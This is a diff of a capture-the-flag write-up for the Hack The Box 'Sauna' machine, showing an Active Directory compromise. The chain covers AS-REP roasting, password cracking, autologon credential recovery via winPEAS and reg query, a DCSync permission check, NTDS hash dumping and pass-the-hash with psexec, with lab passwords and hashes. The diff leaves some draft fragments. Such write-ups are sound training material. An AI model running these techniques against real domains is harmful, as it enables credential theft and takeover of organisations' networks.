@@ -53,8 +53,9 @@ From the scan results, we know that this is probably an Active Directory Domain 
 
 To find out more about this AD domain, let's run the ldap-search NSE script.
 
+`nmap -p 389 --script ldap-search 10.10.10.175`
+
 ```
-nmap -p 389 --script ldap-search 10.10.10.175
 Nmap scan report for EGOTISTICAL-BANK.LOCAL (10.10.10.175)
 Host is up (0.22s latency).
 
@@ -81,6 +82,8 @@ Browsing through the website and ignoring the Loren Ipsum text, we notice:
 * Names of staff we can use to construct a username list.
 
 ## Enumerating Kerberos Usernames
+
+If you're new to Keberos, this is an [excellent introduction](https://www.roguelynn.com/words/explain-like-im-5-kerberos/).
 
 ## Generating Username List
 
@@ -109,11 +112,22 @@ PORT   STATE SERVICE
 
 ## AS-REP Roasting
 
-If you're new to Keberos, this is an excellent introduction.
+Conditions:
 
-How it works
+* Have valid username
+* Pre-Authentication for user is disabled
 
-### Requesting For Encrypted Ticket From Authentication Server
+How it works:
+
+1. User sends a request to the Kerberos Authentication Server (AS).
+2. As pre-authentication is disabled, the AS will reply with a logon session key and a Ticket-Granting Ticket (TGT) **without checking any credentials**. (Hence, AS-REP.)
+3. Both the **logon session key** and the **TGT** are encrypted.
+3. In particular, logon session key is encrypted with a key derived from the **user's password**.
+4. With the encrypted logon session key, we can crack for the user's password offline.
+
+### Requesting For Encrypted Ticket From AS
+
+From Linux, Impacket is the go-to tool for pentesting Kerberos.
 
 `./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile TargetUsers.txt -format john -outputfile hashes.asreproast`
 
@@ -123,10 +137,11 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-User hsmith requires Pre-Authentication so we cannot get the TGT. But we are able to obtain the TGT for fsmith.
+User hsmith requires Pre-Authentication so we cannot get the TGT and the encrypted logon session key.
 
+But we are able to obtain the information for fsmith.
 
-The nmap script above and GetNPUsers use the same mechanism, so technically you can skip the separate enumeration and use Impacket directly the username list.
+The nmap script above and GetNPUsers use the same mechanism, so technically you can skip the separate user enumeration.
 
 ### Cracking Password
 
@@ -167,21 +182,124 @@ Info: Establishing connection to remote endpoint
 
 **We get user.**
 
-## Finding Autologon Password
+## Finding The Autologon Password
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+winPEAS stands for [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).
 
-Use winPEAS
+Let's run it to automate initial privilege escalation enumeration.
 
-## Checking Active Directory Permissions
+Evil-winrm offers an easy way to get C# executables into a target machine. To so, we need to modify our initial command to include the folder with the winPEAS binary.
 
-* Raspbian is a Debian-based distro. Our nmap version scan of SSH revealed Debian as well so this ties in with our assumption.
-* Raspbian has [default credentials](https://www.raspberrypi.org/documentation/linux/usage/users.md). We'll try that in our exploit phase.
+```
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 -e /folder/withbinary/
+*Evil-WinRM* PS C:\Users\FSmith\Documents> menu
 
-<details>
-<summary>DNS probing did not pan out, but if you want to learn more about DNS zone transfer, expand this.</summary>
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
-## Dumping Secrets
+[+] Bypass-4MSI
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-Binary /folder/withbinary/winPEAS.exe
+```
+
+It returns a long output, but the red highlight makes it easy to spot the following.
+
+```
+[+] Looking for AutoLogon credentials(T1012)
+  Some AutoLogon credentials were found!!
+  DefaultDomainName             :  EGOTISTICALBANK
+  DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+  DefaultPassword               :  Moneymakestheworldgoround!
+  ```
+
+If you do not want to use winPEAS, you can also find it through a [manual enumeration process](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
+
+* Autologon information is stored in the HKLM [registry hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives). A hive includes a logical group of keys, subkeys, and values.
+* To retrieve the information, we can use **reg** - [a console registry tool](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query).
+* The `query` parameter lists the next tier of subkeys and their entries.
+
+`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
+
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+    <SNIP>
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    <SNIP>
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+```
+
+## DCSync
+
+Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through an API (DRSUAPI).
+
+In a DCSync attack, we impersonate a Domain Controller to replicate objects.
+
+However, to perform a DCSync attack, the compromised account needs to have the following replication permissions:
+
+The “DS-Replication-Get-Changes” extended right
+* CN: DS-Replication-Get-Changes
+* GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+
+The “Replicating Directory Changes All” extended right
+* CN: DS-Replication-Get-Changes-All
+* GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+
+The “Replicating Directory Changes In Filtered Set” extended right (not always needed)
+* CN: DS-Replication-Get-Changes-In-Filtered-Set
+* GUID: 89e95b76-444d-4c62-991a-0facbeda640c
+
+### Checking Active Directory Permissions
+
+We have compromised two accounts: fsmith and svc_loanmgr. Let's check if any of them has the required permissions for a DCSync attack.
+
+We need the ActiveDirectory module for the following command.
+
+`Import-Module ActiveDirectory`
+
+The part before the `|` gets specific access permissions of objects in the stated domain. The part after filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
+
+`(Get-ACL "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" )}`
+
+The results show that svc_loanmgr has the required permissions.
+
+```
+<SNIP>
+ActiveDirectoryRights : ExtendedRight
+InheritanceType       : None
+ObjectType            : 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : EGOTISTICALBANK\svc_loanmgr
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : ExtendedRight
+InheritanceType       : None
+ObjectType            : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : EGOTISTICALBANK\svc_loanmgr
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+```
+
+### Dumping Secrets
 
 Impacketo
 
@@ -194,38 +312,35 @@ Password:
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
-EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
-EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
-EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
-SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:68d166302ea2ec11acfcdba9f7a4ac01:::
+<SNIP>
 [*] Cleaning up...
 ```
 
-## Passing The Hash
+### Passing The Hash
 
 Impacket-psexec get cmd
 
 `./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`
 
-From Cloudflare
-
-> The Domain Name Systems (DNS) is the phonebook of the Internet.
-
-Like your phone contact list, with it, you do no need to remember your friend's phone numbers. You just need to remember their names.
-
+you need admin share - https://adamtheautomator.com/psexec-ultimate-guide/ - write access?
 
 # Ending Thoughts
 
-This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos.
-
-This is the first retired box I tried, with the help of Ippsec's video. I chose it from his [easy NIX playlist](https://www.youtube.com/playlist?list=PLidcsTyj9JXJfpkDrttTdk1MNT6CDwVZF).
-
-Before this, I rooted only one other machine: Wall (when it was active). That will be another write-up.
-
+This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos. It is a very educational box for me.
 
 *References*
 
-* https://dfir.blog/imaging-using-dcfldd/
-* https://therootuser.com/2017/11/13/recover-deleted-files-using-sleuthkit/
+staffname format
+ad Permissions
+dcsync with impacket
+PTH
+
+Kerberos and AS-REP Roasting
+
+* https://www.tarlogic.com/en/blog/how-kerberos-works/
+* https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
+* https://docs.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets
+* https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+
+evil-winrm
+https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/
